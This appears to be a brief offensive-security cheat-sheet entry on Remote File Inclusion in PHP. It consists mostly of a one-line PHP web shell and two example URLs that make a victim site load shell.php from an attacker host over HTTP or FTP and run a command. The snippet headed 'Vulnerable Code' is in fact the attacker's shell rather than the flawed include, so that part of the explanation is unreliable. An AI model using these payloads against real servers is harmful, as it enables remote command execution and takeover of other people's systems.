# Remote File Inclusion \(RFI\)

## Remote File Inclusion

Remote File Inclusion or RFI occurs when a website allows the inclusion of remotely hosted files. The impact of this vulnerability can be low or high, depending on the server's configuration.

In PHP he `allow_url_fopen` setting \(enabled by default\) and `allow_url_include` setting have to be turned on. 

### Vulnerable Code

PHP vulnerable code:

```php
<?php system($_GET['cmd']); ?>
```

We can include a remote file from our server:

```text
http://victim.vmx/index.php?param=ftp://user:pass@attacker_host/shell.php&cmd=id
http://victim.vmx/index.php?param=http://attacker_host/shell.php&cmd=id
```

